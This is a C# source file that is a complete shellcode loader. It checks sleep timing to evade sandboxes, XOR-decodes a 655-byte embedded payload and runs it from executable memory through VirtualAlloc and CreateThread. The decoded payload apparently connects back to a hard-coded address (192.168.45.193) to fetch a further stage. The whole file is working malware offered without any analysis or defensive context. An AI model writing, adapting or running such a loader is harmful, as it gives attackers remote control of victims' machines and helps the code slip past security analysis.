using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] buf = new byte[655] {0xDE,0x6A,0xA1,0xC6,0xD2,0xCA,0xEE,0x22,0x22,0x22,0x63,0x73,0x63,0x72,0x70,0x6A,0x13,0xF0,0x73,0x74,0x47,0x6A,0xA9,0x70,0x42,0x6A,0xA9,0x70,0x3A,0x6A,0xA9,0x70,0x02,0x6F,0x13,0xEB,0x6A,0xA9,0x50,0x72,0x6A,0x2D,0x95,0x68,0x68,0x6A,0x13,0xE2,0x8E,0x1E,0x43,0x5E,0x20,0x0E,0x02,0x63,0xE3,0xEB,0x2F,0x63,0x23,0xE3,0xC0,0xCF,0x70,0x63,0x73,0x6A,0xA9,0x70,0x02,0xA9,0x60,0x1E,0x6A,0x23,0xF2,0x44,0xA3,0x5A,0x3A,0x29,0x20,0x2D,0xA7,0x50,0x22,0x22,0x22,0xA9,0xA2,0xAA,0x22,0x22,0x22,0x6A,0xA7,0xE2,0x56,0x45,0x6A,0x23,0xF2,0x66,0xA9,0x62,0x02,0x6B,0x23,0xF2,0xA9,0x6A,0x3A,0x72,0xC1,0x74,0x6F,0x13,0xEB,0x6A,0xDD,0xEB,0x63,0xA9,0x16,0xAA,0x6A,0x23,0xF4,0x6A,0x13,0xE2,0x8E,0x63,0xE3,0xEB,0x2F,0x63,0x23,0xE3,0x1A,0xC2,0x57,0xD3,0x6E,0x21,0x6E,0x06,0x2A,0x67,0x1B,0xF3,0x57,0xFA,0x7A,0x66,0xA9,0x62,0x06,0x6B,0x23,0xF2,0x44,0x63,0xA9,0x2E,0x6A,0x66,0xA9,0x62,0x3E,0x6B,0x23,0xF2,0x63,0xA9,0x26,0xAA,0x63,0x7A,0x6A,0x23,0xF2,0x63,0x7A,0x7C,0x7B,0x78,0x63,0x7A,0x63,0x7B,0x63,0x78,0x6A,0xA1,0xCE,0x02,0x63,0x70,0xDD,0xC2,0x7A,0x63,0x7B,0x78,0x6A,0xA9,0x30,0xCB,0x69,0xDD,0xDD,0xDD,0x7F,0x6A,0x13,0xF9,0x71,0x6B,0x9C,0x55,0x4B,0x4C,0x4B,0x4C,0x47,0x56,0x22,0x63,0x74,0x6A,0xAB,0xC3,0x6B,0xE5,0xE0,0x6E,0x55,0x04,0x25,0xDD,0xF7,0x71,0x71,0x6A,0xAB,0xC3,0x71,0x78,0x6F,0x13,0xE2,0x6F,0x13,0xEB,0x71,0x71,0x6B,0x98,0x18,0x74,0x5B,0x85,0x22,0x22,0x22,0x22,0xDD,0xF7,0xCA,0x2D,0x22,0x22,0x22,0x13,0x1B,0x10,0x0C,0x13,0x14,0x1A,0x0C,0x16,0x17,0x0C,0x13,0x1B,0x11,0x22,0x78,0x6A,0xAB,0xE3,0x6B,0xE5,0xE2,0x99,0x23,0x22,0x22,0x6F,0x13,0xEB,0x71,0x71,0x48,0x21,0x71,0x6B,0x98,0x75,0xAB,0xBD,0xE4,0x22,0x22,0x22,0x22,0xDD,0xF7,0xCA,0x46,0x22,0x22,0x22,0x0D,0x77,0x49,0x7B,0x1A,0x72,0x51,0x1B,0x71,0x11,0x6F,0x46,0x49,0x1B,0x75,0x7A,0x11,0x63,0x7A,0x7A,0x75,0x6A,0x63,0x44,0x57,0x54,0x41,0x4B,0x73,0x7A,0x72,0x5B,0x5B,0x73,0x67,0x43,0x44,0x43,0x16,0x72,0x4D,0x46,0x72,0x51,0x73,0x1A,0x53,0x7A,0x0F,0x13,0x56,0x4B,0x52,0x45,0x4A,0x49,0x69,0x6C,0x7D,0x51,0x6B,0x72,0x60,0x56,0x52,0x6B,0x60,0x70,0x70,0x4D,0x15,0x47,0x68,0x4F,0x5A,0x7A,0x72,0x68,0x10,0x6B,0x63,0x4C,0x76,0x7D,0x69,0x74,0x78,0x17,0x68,0x12,0x10,0x65,0x75,0x4F,0x50,0x5A,0x75,0x45,0x5B,0x22,0x6A,0xAB,0xE3,0x71,0x78,0x63,0x7A,0x6F,0x13,0xEB,0x71,0x6A,0x9A,0x22,0x10,0x8A,0xA6,0x22,0x22,0x22,0x22,0x72,0x71,0x71,0x6B,0xE5,0xE0,0xC9,0x77,0x0C,0x19,0xDD,0xF7,0x6A,0xAB,0xE4,0x48,0x28,0x7D,0x6A,0xAB,0xD3,0x48,0x3D,0x78,0x70,0x4A,0xA2,0x11,0x22,0x22,0x6B,0xAB,0xC2,0x48,0x26,0x63,0x7B,0x6B,0x98,0x57,0x64,0xBC,0xA4,0x22,0x22,0x22,0x22,0xDD,0xF7,0x6F,0x13,0xE2,0x71,0x78,0x6A,0xAB,0xD3,0x6F,0x13,0xEB,0x6F,0x13,0xEB,0x71,0x71,0x6B,0xE5,0xE0,0x0F,0x24,0x3A,0x59,0xDD,0xF7,0xA7,0xE2,0x57,0x3D,0x6A,0xE5,0xE3,0xAA,0x31,0x22,0x22,0x6B,0x98,0x66,0xD2,0x17,0xC2,0x22,0x22,0x22,0x22,0xDD,0xF7,0x6A,0xDD,0xED,0x56,0x20,0xC9,0x88,0xCA,0x77,0x22,0x22,0x22,0x71,0x7B,0x48,0x62,0x78,0x6B,0xAB,0xF3,0xE3,0xC0,0x32,0x6B,0xE5,0xE2,0x22,0x32,0x22,0x22,0x6B,0x98,0x7A,0x86,0x71,0xC7,0x22,0x22,0x22,0x22,0xDD,0xF7,0x6A,0xB1,0x71,0x71,0x6A,0xAB,0xC5,0x6A,0xAB,0xD3,0x6A,0xAB,0xF8,0x6B,0xE5,0xE2,0x22,0x02,0x22,0x22,0x6B,0xAB,0xDB,0x6B,0x98,0x30,0xB4,0xAB,0xC0,0x22,0x22,0x22,0x22,0xDD,0xF7,0x6A,0xA1,0xE6,0x02,0xA7,0xE2,0x56,0x90,0x44,0xA9,0x25,0x6A,0x23,0xE1,0xA7,0xE2,0x57,0xF0,0x7A,0xE1,0x7A,0x48,0x22,0x7B,0x99,0xC2,0x3F,0x08,0x28,0x63,0xAB,0xF8,0xDD,0xF7};
            
            byte xorbyte = 0x22;
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ xorbyte);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
